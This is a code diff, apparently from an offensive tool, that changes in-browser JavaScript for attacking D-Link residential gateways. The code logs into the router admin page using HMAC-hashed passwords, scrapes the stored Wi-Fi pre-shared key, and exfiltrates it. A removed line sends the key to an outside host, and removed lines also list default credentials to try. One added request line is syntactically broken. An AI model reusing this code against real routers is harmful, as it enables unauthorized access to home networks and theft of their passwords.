@@ -13,7 +13,7 @@ this._hasher,e=f.finalize(e);f.reset();return f.finalize(this._oKey.clone().conc
 
 // check if this is the dlink
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://192.168.1.1/ui/login', true);
+xhr.open('GET', 'http://'+window.location.hostname+'/ui/login', true);
 xhr.setRequestHeader("hydra","true");
 xhr.onload = function () {
       if(this.response.includes("D-LINK")){
@@ -28,49 +28,31 @@ xhr.send(null);
 
 
 function dlinkStart(){
-	var usernames = ["test","admin"]
-	var passwords = ["password","admin","1234"]
-	var combos = []
-	var i = 0
-	
-	// combines all possibile usernames and passwords
-	for(var i = 0; i < usernames.length; i++)
-	{
-	     for(var j = 0; j < passwords.length; j++)
-	     {
-	        combos.push({"user":usernames[i],"pwd":passwords[j]})
-	     }
-	}
-	
-	
 	// Residential Gateway - D-Link payload
 	function dlinkAttacker(user, passwd) {
-	  // first request to get the nonce
+	  // first request to get the nonce and code1
 	  var xhr = new XMLHttpRequest();
-	  xhr.open('GET', 'http://192.168.1.1/ui/login', true);
+	  xhr.open('GET', 'http://'+window.location.hostname+'/ui/login', true);
 	  xhr.setRequestHeader("hydra","true");
 	  xhr.onload = function () {
 	    // Request finished. Do processing here.
-	    //alert(xhr.response.form.nonce.value)
 	    if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
 	        var username = user
 	        var pwd = passwd
-		//console.log(xhr.response.form)
 	        var nonce = xhr.response.form.nonce.value
+	        var code1 = xhr.response.form.code1.value
 	        var encPwd = CryptoJS.HmacSHA256(pwd, nonce)
 	        var xhr2 = new XMLHttpRequest();
-	        xhr2.open('POST', 'http://192.168.1.1/ui/login', true);
-	  	xhr2.setRequestHeader("hydra","true");
+	        xhr2.open('POST', 'http://'+window.location.hostname'+/ui/login', true);
+	  			xhr2.setRequestHeader("hydra","true");
 	        //Send the proper header information along with the request
 	        xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 	        xhr2.onreadystatechange = function () { //Call a function when the state changes.
 	          if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
 	            try {
 	              var wlanPsk = xhr2.response.getElementById('wlan-psk').innerHTML
-		      // leak password
-								var xhr3 = new XMLHttpRequest();
-								xhr3.open('GET','http://rhaidiz.com/projects/dribble.php?pwd'+wlanPsk);
-								xhr3.send( null );
+		      			// get password
+								sendPwd(wlanPsk);
 	              console.log(wlanPsk)
 	            } catch (e) {
 	              // wrong password
@@ -80,7 +62,7 @@ function dlinkStart(){
 	            }
 	          }
 	        }
-	        var params = 'userName=' + username + '&language=IT&login=Login&userPwd=' + encPwd + '&nonce=' + nonce
+	        var params = 'userName=' + username + '&language=IT&login=Login&userPwd=' + encPwd + '&nonce=' + nonce + '&code1=' + code1
 	        xhr2.responseType = 'document'
 	        xhr2.send(params);
 	    } 
